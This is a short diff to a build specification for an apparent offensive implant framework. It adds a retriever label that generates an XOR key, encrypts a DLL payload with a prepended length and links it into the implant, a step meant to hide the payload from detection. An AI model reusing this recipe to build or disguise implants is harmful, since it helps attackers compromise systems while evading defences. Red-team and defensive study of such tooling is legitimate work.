@@ -46,6 +46,21 @@ retriever.linked_raw_dll.x64:
 	# Link the payload directly into the implant (no obfuscation).
 	push $DLL
 	link "linked_capability"
+	
+retriever.linked_xor_dll.x64:
+	# Load our XOR DLL retriever and merge it in.
+	load "bin/retrievers/linked_xor_dll.x64.o"
+	merge
+	
+	# Generate a 32-byte encryption key and patch it in.
+	generate $XOR_KEY 32
+	patch "XOR_KEY" $XOR_KEY
+	
+	# Encrypt and link the payload (with prepended length so you know how much to decrypt).
+	push $DLL
+	mask "xor" $XOR_KEY
+	preplen
+	link "linked_capability"
 
 # Loader Labels
 
